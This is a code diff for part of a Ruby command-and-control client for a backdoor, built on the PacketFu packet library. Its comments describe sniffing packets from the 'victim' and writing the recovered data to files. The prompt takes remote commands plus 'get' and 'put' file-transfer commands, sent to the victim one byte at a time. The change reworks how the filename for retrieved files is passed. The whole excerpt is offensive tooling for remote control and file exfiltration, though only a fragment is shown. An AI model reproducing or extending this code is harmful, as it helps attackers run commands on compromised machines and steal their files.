@@ -100,13 +100,12 @@ end # wait_cmd_response
 # Creates a PacketFu capture object, and sniffs packets coming from the
 # victim and writes it to file.
 #-------------------------------------------------------------------------------
-def wait_get_response(cmd)
+def wait_get_response(cmd, filename)
     cap = PacketFu::Capture.new(:iface => @opts[:iface], :start => true,
                 :promisc => true)
-    cmds = cmd.split(' ')
-    filename = cmds[1].split('/').last
+    name = filename
     
-    file = File.open(filename, "wb")
+    file = File.open(name, "wb")
     
     #---------------------------------------------------------------------------
     # Capture Packets
@@ -117,7 +116,7 @@ def wait_get_response(cmd)
             
             if packet.tcp_dst == @opts[:dport] then
                 if packet.tcp_flags.fin == 1 then
-                    puts "Data written in: #{filename}"
+                    puts "Data written in: #{name}"
                     file.close
                     return
                 else # fin
@@ -143,7 +142,7 @@ end # wait_get_response
 # Creates a PacketFu capture object, and sniffs packets coming from the
 # victim and writes it to file.
 #-------------------------------------------------------------------------------
-def send_command(cmd, code)
+def send_command(cmd, code, filename = "")
     cfg = PacketFu::Utils.whoami?(:iface => @opts[:iface])
     #---------------------------------------------------------------------------
     # Send one byte at a time
@@ -183,7 +182,7 @@ def send_command(cmd, code)
     if code == 1 then # Regular Command
         wait_cmd_response
     elsif code == 2 then # Get Command
-        wait_get_response(cmd)
+        wait_get_response(cmd, filename)
     elsif code == 3 then # Put Command
     
     end 
@@ -211,7 +210,7 @@ def prompt
         if cmds[0] == "quit" or cmds[0] == "q" then # Quit
             abort("Quitting...")
         elsif cmds[0] == "get" or cmds[0] == "g" then # Get File
-            send_command(cmd, 2)
+            send_command(cmd, 2, cmds.last)
         elsif cmds[0] == "put" or cmd[0] == "p" then # Put File
             send_command(cmd, 3)
         else # Generic Command            
